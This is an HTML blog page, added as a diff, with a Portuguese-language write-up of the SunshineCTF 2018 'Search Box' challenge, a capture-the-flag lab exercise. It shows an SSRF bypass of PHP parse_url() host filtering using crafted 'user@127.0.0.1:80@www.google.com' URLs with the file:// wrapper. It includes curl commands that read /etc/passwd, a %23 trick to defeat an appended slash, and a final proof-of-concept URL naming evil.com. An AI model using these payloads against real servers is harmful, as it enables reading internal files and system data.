@@ -1,0 +1,907 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="songroger">
+
+  <title>SunshineCtf - Search Box Writeup</title>
+
+  <meta name="description" content="&lt;code&gt;&quot;This search engine doesn&apos;t look very secure.Or well coded.Or competent in any way shape or form.This should be easy.&lt;br&gt;&lt;br&g...">
+
+  <!-- Open graph data -->
+  <meta property="og:site_name" content="m<>4k'4"br0">
+  <meta property="og:title" content="SunshineCtf - Search Box Writeup">
+  <meta property="og:url" content="http://localhost:4000/sunshine-search-box/">
+  <meta property="og:type" content="article">
+  <meta property="og:description" content="&lt;code&gt;&quot;This search engine doesn&apos;t look very secure.Or well coded.Or competent in any way shape or form.This should be easy.&lt;br&gt;&lt;br&g...">
+
+  <!-- Standard Stuff -->
+  <link rel="canonical" href="http://localhost:4000/sunshine-search-box/"/>
+  <link rel="alternate" type="application/rss+xml" title="m<>4k'4"br0" href="http://localhost:4000/feed.xml"/>
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-config" content="/assets/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+
+  <!-- Styles -->
+  
+    <style type="text/css">
+      ::selection {
+    background: #1565c0;
+    color: #fff;
+    text-shadow: none
+}
+
+html {
+    font-size: 109.375%;
+    -moz-osx-font-smoothing: grayscale;
+    -webkit-font-smoothing: antialiased;
+    font-smoothing: antialiased;
+    text-size-adjust: 100%;
+    box-sizing: border-box
+}
+
+@media screen and (min-width:700px) {
+    html {
+        font-size: 125%
+    }
+}
+
+@media screen and (min-width:1440px) {
+    html {
+        font-size: 140.625%
+    }
+}
+
+*,
+:after,
+:before {
+    margin: 0;
+    padding: 0;
+    box-sizing: inherit
+}
+
+body {
+    color: #444;
+    font-family: Georgia, Source Sans Pro, sans-serif;
+    font-size: .9rem;
+    line-height: 1.6rem
+}
+
+img {
+    display: block;
+    max-width: 100%;
+    height: auto;
+    border: 0
+}
+
+a:active,
+a:hover,
+a:visited {
+    color: #444;
+    text-decoration: none
+}
+
+strong {
+    font-weight: 700
+}
+
+em {
+    font-style: italic
+}
+
+a {
+    background: transparent;
+    color: #1565c0;
+    text-decoration: none;
+    cursor: pointer;
+    word-wrap: break-word
+}
+
+a:active,
+a:focus,
+a:hover {
+    outline: 0;
+    text-decoration: none
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6,
+p {
+    margin-bottom: .2rem
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    color: #000;
+    font-weight: 700;
+    vertical-align: middle
+}
+
+.cdf{
+    width: 13px;
+    vertical-align: middle;
+    filter: invert(28%) sepia(0%) saturate(1347%) hue-rotate(218deg) brightness(87%) contrast(92%);
+    display: initial;
+}
+h1:not(:first-child),
+h2:not(:first-child),
+h3:not(:first-child),
+h4:not(:first-child),
+h5:not(:first-child),
+h6:not(:first-child) {
+    margin-top: 2.4rem
+}
+
+h1 {
+    font-size: 2rem;
+    line-height: 3.2rem
+}
+
+h2 {
+    font-size: 1.5rem;
+    line-height: 2.4rem
+}
+
+h3 {
+    font-size: 1.17rem
+}
+
+h4 {
+    font-size: 1rem
+}
+
+h5 {
+    font-size: .707rem
+}
+
+h6 {
+    font-size: .5rem
+}
+
+ol,
+ul {
+    margin: 0 0 1.6rem 1.6rem
+}
+
+ol ol,
+ol ul,
+ul ol,
+ul ul {
+    margin: 0 1.6rem
+}
+
+hr {
+    display: block;
+    height: 1.6rem;
+    border: 0;
+    box-shadow: inset 0 1px 0 #eee
+}
+
+blockquote {
+    margin-bottom: 1.6rem;
+    padding: 1.6rem;
+    border-left: 4px solid #e6e6e6;
+    background: #f7f7f7
+}
+
+blockquote p {
+    margin: 0
+}
+
+.col {
+    max-width: calc(700px + 1.6rem);
+    margin: 0 auto;
+    padding: 0 .8rem
+}
+
+@media screen and (min-width:1440px) {
+    .col {
+        max-width: calc(800px + 1.6rem)
+    }
+}
+
+.header {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-around;
+    margin-bottom: 2rem;
+    box-shadow: 0 1px 0 0 #eee
+}
+
+@media screen and (min-width:734px) {
+    .header {
+        font-size: .75rem
+    }
+}
+
+.header__logo {
+    margin-bottom: 0;
+    font-size: 1rem;
+    font-weight: 400;
+    line-height: 1.6rem
+}
+
+.header__logo img {
+    display: initial;
+    width: 30px;
+    height: 30px;
+    vertical-align: middle;
+    border-radius: 15px;
+    opacity: 1
+}
+
+.header__logo img:hover {
+    opacity: .5;
+    transition: all .5s ease-in
+}
+
+.header__logo a {
+    color: #999;
+    text-transform: uppercase
+}
+
+@media screen and (min-width:734px) {
+    .header__logo {
+        font-size: .75rem
+    }
+}
+
+.header__nav {
+    display: flex;
+    flex-wrap: wrap
+}
+
+.header__nav a {
+    color: #444
+}
+
+.header__nav a:hover {
+    color: #999;
+    transition: all .5s ease-in
+}
+
+.header__link {
+    padding: .8rem;
+    color: #444;
+    text-decoration: none;
+    border-bottom: 2px solid transparent;
+    padding-bottom: 1px
+}
+
+.header__link:hover {
+    transition: all .5s ease-in;
+    border-color: hsla(34, 5%, 70%, .7)
+}
+
+.header__link--logo {
+    padding: .8rem;
+    display: block
+}
+
+.header__link--logo:focus,
+.header__link--logo:hover {
+    color: #444;
+    transition: all .5s ease-in
+}
+
+.footer {
+    margin-top: .5rem;
+    padding: 1.6rem 0;
+    box-shadow: inset 0 1px 0 #eee
+}
+
+.footer .col {
+    font-size: 13px;
+    text-align: center
+}
+
+.subscribe {
+    color: #999;
+    transition: all .25s ease-in
+}
+
+.subscribe:hover {
+    color: #444;
+    text-decoration: none
+}
+
+.blocks {
+    display: flex;
+    align-items: center;
+    margin-bottom: .1rem
+}
+
+.blocks--space {
+    justify-content: space-between
+}
+
+.block__item--mr {
+    margin-right: .8rem
+}
+
+.blocks__item a {
+    text-decoration: none;
+    color: #999;
+    border: 3px solid rgba(0, 0, 0, .1);
+    border-radius: 20px;
+    padding: 1px 15px;
+    font-family: Georgia, Microsoft YaHei, sans-serif
+}
+
+.blocks__item a:hover {
+    color: #444;
+    border-color: #999;
+    transition: all .5s ease-in
+}
+
+.blocks__item .btn {
+    box-shadow: inset 0 0 0 0 #1565c0
+}
+
+.article {
+    margin-bottom: 3rem;
+    animation: itemshow .9s linear
+}
+
+.article__title {
+    margin-bottom: .8rem
+}
+
+.article__title--single,
+.article__title a {
+    font-family: Georgia, Microsoft YaHei, sans-serif
+}
+
+.article__title a {
+    color: #444;
+    transition: all .25s ease-in
+}
+
+.article__title a:hover {
+    color: #999;
+    text-decoration: none
+}
+
+.article__date {
+    display: block;
+    margin-bottom: .8rem;
+    font-size: .7501rem
+}
+
+.cover {
+    margin-bottom: .5rem
+}
+
+.cover img {
+    width: 100%
+}
+
+.article__more {
+    color: #999;
+    text-decoration: none
+}
+
+.article__more:hover {
+    transition: all .5s ease-in;
+    color: #444;
+    text-decoration: none
+}
+
+.post-tags {
+    text-align: right;
+    text-decoration: none;
+    font: italic 700 12px/30px Georgia, serif
+}
+
+.post-tags a {
+    color: #999
+}
+
+.post-tags a:hover {
+    color: #444;
+    text-decoration: none
+}
+
+@-webkit-keyframes 'itemshow' {
+    0% {
+        top: -60px;
+        opacity: 0
+    }
+
+    33% {
+        top: -40px;
+        opacity: .2
+    }
+
+    66% {
+        top: -20px;
+        opacity: .6
+    }
+
+    to {
+        top: 0;
+        opacity: 1
+    }
+}
+
+@keyframes 'itemshow' {
+    0% {
+        top: -60px;
+        opacity: 0
+    }
+
+    33% {
+        top: -40px;
+        opacity: .2
+    }
+
+    66% {
+        top: -20px;
+        opacity: .6
+    }
+
+    to {
+        top: 0;
+        opacity: 1
+    }
+}
+
+.arch-item {
+    margin-bottom: 10px;
+    animation: itemshow .9s linear
+}
+
+.arch-title {
+    color: #444;
+    font-size: 20px;
+    font-family: Georgia, Hiragino Sans GB, Microsoft YaHei, sans-serif;
+    font-weight: 700;
+    padding-right: 10px
+}
+
+.arch-title:hover {
+    color: #999;
+    transition: all .25s ease-in
+}
+
+time {
+    font-size: 15px;
+    font-family: Optima, Helvetica Neue, sans-serif
+}
+
+.arch-desc,
+time {
+    color: #999
+}
+
+code,
+pre {
+    background: #f7f7f7;
+    font-family: Source Code Pro, monospace;
+    font-size: .847rem;
+    overflow-x: auto;
+    vertical-align: top
+}
+
+.highlight {
+    margin-bottom: 1.6rem;
+    padding: .8rem;
+    background: #f7f7f7;
+    box-shadow: inset 0 0 0 1px #eee
+}
+
+.highlight .c {
+    color: #998
+}
+
+.highlight .err {
+    background-color: #e3d2d2;
+    color: #a61717
+}
+
+.highlight .k,
+.highlight .o {
+    font-weight: 400
+}
+
+.highlight .cm {
+    color: #998
+}
+
+.highlight .cp {
+    color: #999;
+    font-weight: 400
+}
+
+.highlight .c1 {
+    color: #998
+}
+
+.highlight .cs {
+    color: #999;
+    font-weight: 400
+}
+
+.highlight .gd {
+    background-color: #fdd;
+    color: #000
+}
+
+.highlight .gd .x {
+    background-color: #faa;
+    color: #000
+}
+
+.highlight .gr {
+    color: #a00
+}
+
+.highlight .gh {
+    color: #999
+}
+
+.highlight .gi {
+    background-color: #dfd;
+    color: #000
+}
+
+.highlight .gi .x {
+    background-color: #afa;
+    color: #000
+}
+
+.highlight .go {
+    color: #888
+}
+
+.highlight .gp {
+    color: #555
+}
+
+.highlight .gs {
+    font-weight: 400
+}
+
+.highlight .gu {
+    color: #aaa
+}
+
+.highlight .gt {
+    color: #a00
+}
+
+.highlight .kc,
+.highlight .kd,
+.highlight .kp,
+.highlight .kr,
+.highlight .kt {
+    font-weight: 400
+}
+
+.highlight .kt {
+    color: #458
+}
+
+.highlight .m {
+    color: #099
+}
+
+.highlight .s {
+    color: #d14
+}
+
+.highlight .na {
+    color: teal
+}
+
+.highlight .nb {
+    color: #0086b3
+}
+
+.highlight .nc {
+    color: #458;
+    font-weight: 400
+}
+
+.highlight .no {
+    color: teal
+}
+
+.highlight .ni {
+    color: purple
+}
+
+.highlight .ne,
+.highlight .nf {
+    color: #900;
+    font-weight: 400
+}
+
+.highlight .nn {
+    color: #555
+}
+
+.highlight .nt {
+    color: navy
+}
+
+.highlight .nv {
+    color: teal
+}
+
+.highlight .ow {
+    font-weight: 400
+}
+
+.highlight .w {
+    color: #bbb
+}
+
+.highlight .mf,
+.highlight .mh,
+.highlight .mi,
+.highlight .mo {
+    color: #099
+}
+
+.highlight .s2,
+.highlight .sb,
+.highlight .sc,
+.highlight .sd,
+.highlight .se,
+.highlight .sh,
+.highlight .si,
+.highlight .sx {
+    color: #d14
+}
+
+.highlight .sr {
+    color: #009926
+}
+
+.highlight .s1 {
+    color: #d14
+}
+
+.highlight .ss {
+    color: #990073
+}
+
+.highlight .bp {
+    color: #999
+}
+
+.highlight .vc,
+.highlight .vg,
+.highlight .vi {
+    color: teal
+}
+
+.highlight .il {
+    color: #099
+}
+    </style>
+  
+
+
+</head>
+
+<body>
+
+  <header class="header">
+
+    
+      <h1 class="header__logo">
+        <a href="/" class="header__link--logo">m<>4k'4"br0</a>
+      </h1>
+    
+
+    <nav class="header__nav" role="navigation">      
+      <a href="/archive/" class="header__link">Archive</a>
+      <!-- <a href="http://github.com/m4k4br0" class="header__link" target="_blank">Github</a> -->
+      <a href="/about/" class="header__link">About</a>
+    </nav>
+  </header>
+
+  <main class="col">
+
+
+<article class="article">
+  <h2 class="article__title article__title--single">SunshineCtf - Search Box Writeup</h2>
+  <time class="article__date" datetime="2018-04-08"> 00:00 Apr.08-2018</time>
+  
+  <code>"This search engine doesn't look very secure.
+Or well coded.
+Or competent in any way shape or form.
+This should be easy.
+<br>
+<br>
+Note: flag is in /etc/flag.txt
+<br>
+<br>
+http://search-box.web1.sunshinectf.org"</code>
+<br>
+<br>
+Dentro da página tinhas um pequeno input para enviarmos uma request para um site que seria algum "qualquer".
+<br>
+<img src="https://i.imgur.com/vltSBlC.png">
+<br>
+<img src="https://i.imgur.com/wpr4QMb.png">
+<br>
+<br>
+Porém, com alguns pequenos testes acabei percebendo que ele estava apenas aceitando o <code>host</code> como sendo 'www.google.com'.
+Lógicamente uma das primeiras coisas que me veio na cabeça seria tentar acessar algum arquivo via <code>file://</code>, porem, sem sucesso.
+<br>
+<img src="https://i.imgur.com/ImCQbcQ.png">
+<br>
+<br>
+no momento que eu comecei a pensar que o <code>file://</code> não teria serventia, pensei em fazer o seguinte, juntar o wrapper mais o domínio que havia funcionado:
+<br>
+<img src="https://i.imgur.com/gpuZAAn.png">
+<br>
+<code>"get source failed"</code>, oops, então quer dizer que o wrapper na verdade funciona, o que não está dando certo é a procura pelo www.google.com nos diretorios, ou seja, aqui temos um filtro de host, e para confirmar isso:
+<br>
+<img src="https://i.imgur.com/MnYZ7CY.png">
+<br>
+<br>
+Está sendo usado o <code>parse_url()</code> do php, se fizermos alguns pequenos testes, podemos tirar nossas conclusões:
+<br>
+<br>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">php <span class="o">&gt;</span> <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"file://www.google.com"</span><span class="p">;</span>
+php <span class="o">&gt;</span> var_dump<span class="o">(</span>parse_url<span class="o">(</span><span class="nv">$url</span><span class="o">))</span><span class="p">;</span>
+array<span class="o">(</span>2<span class="o">)</span> <span class="o">{</span>
+  <span class="o">[</span><span class="s2">"scheme"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>4<span class="o">)</span> <span class="s2">"file"</span>
+  <span class="o">[</span><span class="s2">"host"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>14<span class="o">)</span> <span class="s2">"www.google.com"</span>
+<span class="o">}</span></code></pre></figure>
+<br>
+Levando em consideração que o nosso host precisa ser sempre www.google.com, precisamos achar uma forma de conseguir passar uma chamada para algum arquivo interno, ou primeiro, tentar conseguir acessar o localhost.
+<br>
+<br>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">php <span class="o">&gt;</span> <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1@www.google.com"</span><span class="p">;</span>
+php <span class="o">&gt;</span> var_dump<span class="o">(</span>parse_url<span class="o">(</span><span class="nv">$url</span><span class="o">))</span><span class="p">;</span>
+array<span class="o">(</span>3<span class="o">)</span> <span class="o">{</span>
+  <span class="o">[</span><span class="s2">"scheme"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>4<span class="o">)</span> <span class="s2">"http"</span>
+  <span class="o">[</span><span class="s2">"host"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>14<span class="o">)</span> <span class="s2">"www.google.com"</span>
+  <span class="o">[</span><span class="s2">"user"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>9<span class="o">)</span> <span class="s2">"127.0.0.1"</span>
+<span class="o">}</span></code></pre></figure>
+<br>
+Neste output acima, estamos passando o 127.0.0.1 como user, porem, o curl nao vai encontrar um user de autenticação igual a <code>127.0.0.1</code>, a url será interpretada corretamente:
+<br>
+<img src="https://i.imgur.com/Q3N9nUN.png">
+<br>
+Podemos tirar nossas conclusões que, se ele retornou "Source Code", ou estamos em <code>127.0.0.1</code> e o nosso bypass funcionou, ou estamos em <code>www.google.com</code>.
+Para saber isso, podemos tentar pegar algum arquivo interno, como o index.php que existe no webroot.
+<br>
+<img src="https://i.imgur.com/mPBmx5f.png">
+<br>
+Eee... não funcionou. 
+<br>
+<br>
+Fazendo algumas rápidas pesquisas e alguns testes, identifiquei um outro bypass, onde passamos um <code>user@127.0.0.1</code> como usuário mais uma porta de destino,www.google.com continua sendo o host, porem a interpretação do curl acaba desvalorizando isso. Então, o <code>parse_url()</code> praticamente não tem uma serventia de segurança neste código:
+<br>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">php <span class="o">&gt;</span> <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://user@127.0.0.1:80@www.google.com/index.php"</span><span class="p">;</span>
+php <span class="o">&gt;</span> var_dump<span class="o">(</span>parse_url<span class="o">(</span><span class="nv">$url</span><span class="o">))</span><span class="p">;</span>
+array<span class="o">(</span>5<span class="o">)</span> <span class="o">{</span>
+  <span class="o">[</span><span class="s2">"scheme"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>4<span class="o">)</span> <span class="s2">"http"</span>
+  <span class="o">[</span><span class="s2">"host"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>14<span class="o">)</span> <span class="s2">"www.google.com"</span>
+  <span class="o">[</span><span class="s2">"user"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>14<span class="o">)</span> <span class="s2">"user@127.0.0.1"</span>
+  <span class="o">[</span><span class="s2">"pass"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>2<span class="o">)</span> <span class="s2">"80"</span>
+  <span class="o">[</span><span class="s2">"path"</span><span class="o">]=&gt;</span>
+  string<span class="o">(</span>10<span class="o">)</span> <span class="s2">"/index.php"</span>
+<span class="o">}</span></code></pre></figure>
+<br>
+Fiz também um teste local, com um código em /var/www/html/x.php
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl <span class="nt">-v</span> <span class="s2">"http://user@127.0.0.1:80@www.google.com/x.php"</span>
+<span class="k">*</span>   Trying 127.0.0.1...
+<span class="k">*</span> Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+<span class="k">*</span> Server auth using Basic with user <span class="s1">'user'</span>
+<span class="o">&gt;</span> GET /x.php HTTP/1.1
+<span class="o">&gt;</span> Host: 127.0.0.1
+<span class="o">&gt;</span> Authorization: Basic <span class="nv">dXNlcjo</span><span class="o">=</span>
+<span class="o">&gt;</span> User-Agent: curl/7.47.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> 
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 07 Apr 2018 00:47:05 GMT
+&lt; Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Content-Length: 11
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+&lt; 
+TEST SSRF
+<span class="k">*</span> Connection <span class="c">#0 to host 127.0.0.1 left intact</span></code></pre></figure>
+<br>
+<br>
+então fui para a aplicação:
+<br>
+<img src="https://i.imgur.com/PZmUHgj.png">
+<br>
+<img src="https://i.imgur.com/nYUEobv.png">
+<br>
+Porém a challenge nos dizia que era necessário pegar a flag em <code>/etc/flag.txt</code>, mas não havia como eu usar o <code>file://</code> pois nenhum arquivo estava sendo lido, me pareceu estranho isso.
+<br>
+<img src="https://i.imgur.com/xJWLbbN.png">
+<br>
+<br>
+notei que ao final de cada arquivo passado, estava sendo concatenada à request uma <code>/</code>, resolvi testar isso direto pelo curl e comparar os resultados:
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl <span class="nt">-v</span> <span class="s2">"file://user@127.0.0.1:80@www.google.com/etc/passwd"</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</code></pre></figure>
+
+<br>
+VS:
+<br>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl <span class="nt">-v</span> <span class="s2">"file://user@127.0.0.1:80@www.google.com/etc/passwd/"</span>
+<span class="k">*</span> Couldn<span class="s1">'t open file /etc/passwd/
+* Closing connection -1
+curl: (37) Couldn'</span>t open file /etc/passwd/</code></pre></figure>
+<br>
+<br>
+Pensei em colocar uma "#" para travar isso, o curl aceitou:
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>curl <span class="nt">-v</span> <span class="s2">"file://user@127.0.0.1:80@www.google.com/etc/passwd#/"</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin</code></pre></figure>
+<br>
+Mas a aplicação(usando o burp), não aceitou:
+<br>
+<img src="https://i.imgur.com/sn6lkYR.png">
+<br>
+Então fiz o simples, o encode de <code>#</code> para ser igual a <code>%23</code>, e funcionou!
+<br>
+<img src="https://i.imgur.com/W6BsOji.png">
+<br>
+<img src="https://i.imgur.com/BvHy36g.png">
+<br>
+<code>Flag: sun{R3quE5t_tyP3S_m4tT3r}</code>
+<br>
+
+<code>final PoC: file://user@evil.com:80@www.google.com//var/www/html/index.php%23</code>
+
+
+
+
+  
+</article>
+
+
+
+
+<footer class="footer">
+	<div class="col">
+		© 2018 m<>4k'4"br0 | <a href="/feed.xml" class="subscribe">RSS</a>
+	</div>
+</footer>
+
+<script type="text/javascript">
+  //友盟统计
+  var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+  document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1260641879'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1260641879' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</body>
+</html>
